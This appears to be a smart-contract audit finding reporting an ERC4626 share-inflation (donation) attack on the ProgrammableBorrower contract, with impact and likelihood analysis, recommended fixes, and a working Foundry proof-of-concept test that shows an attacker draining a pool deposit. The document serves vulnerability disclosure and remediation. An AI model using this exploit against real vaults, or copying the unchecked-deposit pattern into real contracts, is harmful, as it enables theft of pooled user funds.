### Title
Unvalidated ERC4626 deposit lets a vault user steal programmable-borrower funds through share inflation - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits idle pool funds into a configured ERC4626 vault without enforcing a minimum number or value of minted shares. If the vault is empty or thinly supplied and uses balance-based share pricing, an unprivileged vault user can deposit one share, donate assets to inflate the share price, and cause the programmable borrower’s epoch-start deposit to mint zero or economically worthless shares. The attacker then redeems their share for both the donation and the pool deposit.

### Finding Description
The vault is accepted solely based on a nonzero address and matching `asset()` during initialization or `setVault`; there is no minimum liquidity, supply, virtual-share, or share-valuation requirement. [1](#0-0) [2](#0-1) 

At epoch start, `onStartEpoch` snapshots all on-hand underlying and pre-existing vault assets as `epochStartVaultAssets`, then deposits the entire on-hand balance through `_depositToVault`. [3](#0-2)  `_depositToVault` calls `vault.deposit` and merely records or emits the returned share amount; it does not check that the shares can be converted back to approximately `_assetAmount`. [4](#0-3) 

For an ERC4626 vault whose deposit formula is approximately `assets * totalSupply / totalAssets`, an attacker can first mint one share and then directly transfer a large donation to the vault. When `ProgrammableBorrower` deposits `P` after the donation, integer rounding can mint `P * 1 / (donation + 1)` shares; a donation at least equal to `P` can round the result to zero. The borrower’s accounting later measures the position using `convertToAssets(vault.balanceOf(address(this)))`, so the missing shares become a vault loss while the attacker’s inflated share redeems nearly the entire vault balance. [5](#0-4) [6](#0-5) 

The resulting vault loss reduces `totalInterestDueNow` and therefore the amount reported to `IdleCDOEpochVariant` at epoch stop. [7](#0-6) [8](#0-7) 

### Impact Explanation
A deposit of `P` underlying into an empty susceptible vault can be stolen almost entirely after an attacker spends approximately `P + 1` underlying to create the price inflation. The attacker deposits one unit, donates `P`, receives the borrower’s `P` through redemption, and exits with approximately `2P + 1` underlying, for a net profit of approximately `P`. The programmable borrower is left with zero or near-zero redeemable shares despite `epochStartVaultAssets` including the deposited principal.

This breaks deposit solvency and donation isolation: externally donated assets can change the number of shares issued for pool principal, rather than being isolated from the deposit. A sufficiently large theft can also force `onStopEpoch` to fail liquidity requirements and push the credit vault into the borrower-default path even though the configured borrower honored its accounting obligations. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
Likelihood depends on the configured ERC4626 vault. A mature vault with substantial existing supply makes the donation cost proportional to the target deposit and generally uneconomic, while an empty, newly deployed, thinly supplied, or rounding-susceptible vault is directly exploitable. `initialize` and `setVault` only verify the vault asset and permit a vault with zero shares or assets, so no privileged actor needs to behave maliciously for the susceptible state to exist. [11](#0-10) [12](#0-11) 

### Recommendation
Require a minimum acceptable share amount for every vault deposit, calculated from the vault’s pre-deposit `convertToShares(_assetAmount)` or an independently tracked share price. After `vault.deposit`, compare `vault.balanceOf(address(this))` before and after the call and revert if the delta is below the minimum or if `convertToAssets(receivedShares)` differs from `_assetAmount` beyond a bounded rounding allowance. [4](#0-3) 

Additionally, restrict configured vaults to implementations with virtual shares or another first-depositor defense and enforce a minimum initial vault supply/liquidity during initialization and vault replacement. Reject zero-share deposits explicitly so donation inflation cannot silently turn pool principal into a vault loss. [2](#0-1) 

### Proof of Concept
The following Foundry test uses a mainnet fork only for the underlying token and deploys a minimal ERC4626-style vault whose conversions have the same balance-based rounding shape accepted by `ProgrammableBorrower`. It demonstrates that one attacker share plus a donation equal to the pool deposit causes the borrower’s deposit to mint zero shares and lets the attacker redeem the pool funds.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableVault is ERC20 {
  IERC20 public immutable assetToken;

  constructor(address asset_) ERC20("Inflatable Vault", "IVLT") {
    assetToken = IERC20(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    if (supply == 0 || assetsBefore == 0) return assets;
    return assets * supply / assetsBefore;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    shares = convertToShares(assets);
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function withdraw(uint256 assets, address receiver, address owner)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply();
    uint256 managedAssets = assetToken.balanceOf(address(this));
    shares = supply == 0 || managedAssets == 0
      ? assets
      : (assets * supply + managedAssets - 1) / managedAssets;
    if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    return convertToAssets(balanceOf(owner));
  }
}

contract DummyCDO {
  address public token;
  constructor(address token_) {
    token = token_;
  }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
  IERC20 constant USDC =
    IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

  function testVaultShareInflationStealsEpochDeposit() external {
    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

    address attacker = makeAddr("attacker");
    address borrower = makeAddr("borrower");
    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    uint256 poolDeposit = 1_000_000e6;

    InflatableVault vault = new InflatableVault(address(USDC));
    DummyCDO cdo = new DummyCDO(address(USDC));

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    ProgrammableBorrower programmableBorrower = ProgrammableBorrower(
      address(new TransparentUpgradeableProxy(
        address(implementation),
        makeAddr("proxyAdmin"),
        abi.encodeWithSelector(
          ProgrammableBorrower.initialize.selector,
          address(vault),
          address(cdo),
          owner,
          manager,
          borrower,
          0
        )
      ))
    );

    // Attacker creates the first share and inflates its price.
    deal(address(USDC), attacker, poolDeposit + 1);
    vm.startPrank(attacker);
    USDC.approve(address(vault), 1);
    vault.deposit(1, attacker);
    USDC.transfer(address(vault), poolDeposit);
    vm.stopPrank();

    // IdleCDO-held principal arrives at ProgrammableBorrower before epoch start.
    deal(address(USDC), address(programmableBorrower), poolDeposit);

    vm.prank(address(cdo));
    programmableBorrower.onStartEpoch(0);

    // poolDeposit * 1 / (poolDeposit + 1) rounds to zero shares.
    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.vaultLoss(), poolDeposit);

    uint256 attackerBefore = USDC.balanceOf(attacker);
    vm.prank(attacker);
    uint256 stolen = vault.redeem(1, attacker, attacker);

    assertEq(stolen, 2 * poolDeposit + 1);
    assertEq(
      USDC.balanceOf(attacker) - attackerBefore,
      2 * poolDeposit + 1
    );
  }
}
```
